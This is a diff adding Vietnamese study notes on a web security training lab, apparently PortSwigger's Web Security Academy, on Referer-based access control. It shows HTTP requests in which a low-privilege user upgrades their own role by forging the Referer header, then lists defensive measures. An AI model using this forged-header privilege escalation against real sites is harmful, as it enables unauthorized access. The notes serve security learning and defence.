@@ -304,6 +304,58 @@ action=upgrade&confirmed=true&username=wiener
 ```
 - Do hệ thống không kiểm soát truy cập ở bước này nên request được chấp nhận.
 
+### Lab: Referer-based access control 
+#### Analysis
+- Login bằng tài khoản `admin`
+- Sử dụng chức năng `change-roles`
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: 0ac600170472214b803694d8009800ab.web-security-academy.net
+...
+Referer: https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin
+...
+```
+- Ta thấy **header Referer**, thử thay đổi giá trị của nó => `"Unauthorized"`
+- Cho thấy server kiểm soát truy cập dựa trên **header Referer** với giá trị `https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin`
+
+#### Exploit
+- Login bằng người dùng `wiener`
+- Thực hiện chức năng `change-roles` và thêm **header Referer** với giá trị `https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin`
+```http
+GET /admin-roles?username=wiener&action=upgrade HTTP/2
+Host: 0ac600170472214b803694d8009800ab.web-security-academy.net
+...
+Referer: https://0ac600170472214b803694d8009800ab.web-security-academy.net/admin
+...
+```
+- Thành công
+
+## Prevent
+--- 
+### Never rely on obfuscation alone
+- **Vấn đề:** Việc giấu **URL** (như /admin-xyz123) hoặc không hiển thị nút bấm không ngăn người dùng truy cập.
+- **Giải pháp:** Luôn phải kiểm tra quyền truy cập ở phía **server**. Nếu user không có quyền, trả về lỗi **403** hoặc chuyển hướng phù hợp.
+
+### Deny access by default
+- **Vấn đề:** Nếu bạn mặc định cho phép, sẽ dễ bỏ sót quyền kiểm soát.
+- **Giải pháp:** Mặc định là từ chối tất cả truy cập, chỉ cho phép nếu rõ ràng user có quyền.
+
+### Use a centralized access control mechanism
+- **Vấn đề:** Nếu logic kiểm soát truy cập nằm rải rác, sẽ dễ sai sót.
+- **Giải pháp:** Dùng **middleware** hoặc **module** dùng chung để kiểm tra quyền
+
+### Make access rules explicit in code
+- **Vấn đề:** Nếu không rõ quyền nào áp dụng cho **endpoint** nào, sẽ dễ xảy ra lỗi.
+- **Giải pháp:** Bắt buộc **developer** khai báo rõ ràng quyền truy cập ở mỗi API hoặc chức năng. Nếu thiếu, báo lỗi trong quá trình **build/test**.
+
+### Audit and test access control regularly
+- **Vấn đề:** Các lỗi về phân quyền thường không dễ phát hiện.
+- **Giải pháp:**
+    - Rà soát code (code review)
+    - Viết test kiểm tra truy cập
+    - Dùng công cụ như **Burp Suite** để thử tấn công
+    - Thực hiện **pentest** định kỳ hoặc mở chương trình bug bounty
+
 ---
 Goodluck! 🍀🍀🍀 
 
